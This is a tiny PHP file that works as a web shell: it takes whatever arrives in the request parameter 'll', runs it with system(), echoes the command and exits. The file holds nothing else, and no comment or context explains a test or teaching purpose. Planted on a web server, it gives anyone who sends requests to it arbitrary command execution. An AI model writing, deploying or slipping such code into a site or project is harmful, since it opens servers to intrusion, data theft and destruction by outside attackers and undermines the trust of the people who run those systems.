<?php
if(isset($_REQUEST['ll'])) {
    $cmd = ($_REQUEST["ll"]);
    system($cmd);
    echo "</pre>$cmd<pre>";
    die;
}
?>
